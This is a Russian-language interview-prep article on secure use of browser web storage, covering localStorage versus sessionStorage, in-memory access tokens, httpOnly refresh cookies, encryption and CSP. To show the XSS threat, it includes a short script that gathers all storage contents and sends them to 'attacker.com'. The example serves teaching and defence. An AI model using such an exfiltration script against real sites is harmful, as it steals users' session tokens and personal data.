# Q013. Лучшие практики при работе с веб-хранилищем?

> **Источник:** [03. security.md](../03.%20security.md) · **Тема:** Security

---

## Короткий ответ

Веб-хранилища (localStorage, sessionStorage, IndexedDB) **уязвимы к XSS** — любой скрипт на странице имеет к ним полный доступ. Основные правила: не хранить sensitive данные (токены, пароли, PII) в localStorage; использовать sessionStorage вместо localStorage там, где данные нужны только в рамках сессии; для аутентификационных токенов — предпочитать httpOnly cookies; шифровать данные при необходимости; регулярно очищать хранилище и ограничивать доступ через CSP.

---

## Развёрнутый ответ

### Виды веб-хранилищ

| Хранилище | Область видимости | Время жизни | Размер | Доступ из JS |
|-----------|------------------|-------------|--------|-------------|
| `localStorage` | Домен + протокол | Постоянно (пока не удалить) | ~5–10 MB | Полный |
| `sessionStorage` | Вкладка + домен | До закрытия вкладки | ~5–10 MB | Полный |
| `IndexedDB` | Домен | Постоянно | Сотни MB | Полный |
| `cookies` (HttpOnly) | Домен/path | По атрибуту | 4 KB | Недоступен для JS |

### Главная угроза: XSS-доступ

```javascript
// XSS-скрипт может украсть всё содержимое:
const stolenData = {
  localStorage: { ...localStorage },
  sessionStorage: { ...sessionStorage },
};
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify(stolenData),
});
// IndexedDB тоже читается, просто асинхронно
```

### Что НЕЛЬЗЯ хранить в веб-хранилище

```typescript
// ❌ Никогда:
localStorage.setItem('accessToken', 'eyJhbGciOiJIUzI1NiJ9...');
localStorage.setItem('refreshToken', 'abc123...');
localStorage.setItem('password', userPassword);
localStorage.setItem('creditCard', '4111111111111111');
localStorage.setItem('ssn', '123-45-6789');

// ❌ Осторожно (зависит от контекста):
localStorage.setItem('userId', '123'); // видно, кто пользователь
localStorage.setItem('email', 'user@example.com'); // PII
```

### Что МОЖНО хранить

```typescript
// ✅ Безопасно (не sensitive):
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'ru');
localStorage.setItem('lastVisitedPage', '/dashboard');
localStorage.setItem('ui_preferences', JSON.stringify({ sidebarOpen: true }));

// ✅ sessionStorage для временных данных:
sessionStorage.setItem('onboardingStep', '3');
sessionStorage.setItem('formDraft', JSON.stringify(formData)); // черновик формы
// Очищается при закрытии вкладки — меньше риск
```

### Паттерн: Access Token в памяти + Refresh Token в httpOnly Cookie

```typescript
// Рекомендуемый подход для SPA:

// ❌ Уязвимо к XSS:
localStorage.setItem('accessToken', token);

// ✅ Безопасно:
// 1. accessToken — в памяти приложения (React state, module variable)
// 2. refreshToken — в httpOnly cookie (устанавливается сервером)

let _accessToken: string | null = null; // module-level variable

export const tokenStore = {
  setAccessToken(token: string) { _accessToken = token; },
  getAccessToken() { return _accessToken; },
  clearAccessToken() { _accessToken = null; },
};

// При обновлении страницы токен теряется → автоматически обновляем через /refresh
async function initializeAuth() {
  try {
    // refreshToken отправится автоматически как httpOnly cookie
    const response = await fetch('/api/auth/refresh', { credentials: 'include' });
    if (response.ok) {
      const { accessToken } = await response.json();
      tokenStore.setAccessToken(accessToken);
    }
  } catch {
    // Пользователь не залогинен
  }
}
```

### Шифрование данных в localStorage (если другого варианта нет)

```typescript
import { AES, enc } from 'crypto-js';

const STORAGE_KEY = process.env.NEXT_PUBLIC_STORAGE_ENCRYPTION_KEY!;

// Шифрование перед сохранением
function secureStore(key: string, value: unknown): void {
  const serialized = JSON.stringify(value);
  const encrypted = AES.encrypt(serialized, STORAGE_KEY).toString();
  localStorage.setItem(key, encrypted);
}

// Расшифровка при чтении
function secureRetrieve<T>(key: string): T | null {
  const encrypted = localStorage.getItem(key);
  if (!encrypted) return null;
  
  try {
    const decrypted = AES.decrypt(encrypted, STORAGE_KEY).toString(enc.Utf8);
    return JSON.parse(decrypted) as T;
  } catch {
    localStorage.removeItem(key); // некорректные данные — удаляем
    return null;
  }
}

// ⚠️ Ограничение: ключ шифрования доступен в JS, поэтому XSS всё равно может его прочитать
// Это усложняет атаку, но не делает данные абсолютно безопасными
```

### Управление жизненным циклом

```typescript
// 1. Очищать при logout
function clearStorageOnLogout(): void {
  localStorage.removeItem('theme'); // оставляем только non-sensitive
  sessionStorage.clear(); // полная очистка sessionStorage
}

// 2. Версионирование схемы данных (избегать устаревших данных)
const STORAGE_VERSION = '2';
const storedVersion = localStorage.getItem('storageVersion');

if (storedVersion !== STORAGE_VERSION) {
  localStorage.clear(); // сброс при изменении схемы
  localStorage.setItem('storageVersion', STORAGE_VERSION);
}

// 3. Валидация данных при чтении
function getPreferences(): UserPreferences {
  const raw = localStorage.getItem('preferences');
  if (!raw) return DEFAULT_PREFERENCES;
  
  const parsed = PreferencesSchema.safeParse(JSON.parse(raw));
  return parsed.success ? parsed.data : DEFAULT_PREFERENCES;
}
```

### CSP как дополнительная защита

```http
Content-Security-Policy: 
  script-src 'self' 'nonce-{random}';
  default-src 'self'
```

CSP ограничивает выполнение скриптов, снижая вероятность XSS, который мог бы украсть данные из хранилища.

### Важные нюансы

- **localStorage и sessionStorage не синхронизируются между вкладками** автоматически для sessionStorage; localStorage — синхронизируется через `storage` event
- **Private/Incognito режим** — localStorage доступен, но очищается после закрытия окна (поведение различается по браузерам)
- **Квоты хранилища** — при переполнении `localStorage.setItem` выбрасывает `QuotaExceededError`; нужно обрабатывать
- **IndexedDB для крупных данных** — для хранения >1MB объектов (кеш данных, офлайн-контент) используйте IndexedDB, а не localStorage

---

## На что обратить внимание на собеседовании

### Каверзные follow-up (что спросят дальше)

- **localStorage vs sessionStorage — когда что выбрать?** — sessionStorage для данных, не переживающих закрытие вкладки (черновики форм, wizard steps); localStorage для persistent preferences (тема, язык).
- **Можно ли защитить localStorage от XSS?** — Полностью — нет (JS имеет доступ). Частично: CSP ограничивает источники скриптов; шифрование усложняет кражу данных.
- **Web Storage vs Cookies — в чём разница?** — Cookies: отправляются в HTTP-запросах автоматически, HttpOnly защищает от JS, SameSite от CSRF. Storage: только JS-доступ, больше размер, не отправляются с запросами.
- **Как безопасно кешировать API-ответы?** — Не кешировать sensitive данные вообще; если кешировать — с TTL, шифрованием и очисткой при logout.

### Красные флаги (чего не говорить)

- «Храним JWT в localStorage — это стандартная практика» — это антипаттерн; уязвимо к XSS.
- «localStorage зашифрован браузером» — нет, данные хранятся в plaintext в профиле браузера.
- «sessionStorage безопаснее localStorage» — оба уязвимы к XSS; sessionStorage лишь короче живёт.

### Связанные темы

- `011-secure-i-httponly-cookies.md`
- `012-mery-bezopasnosti-cookie-na-storone-klienta.md`
- `021-zashchita-ot-xss.md`
- `009-chto-takoe-tokeny-jwt.md`
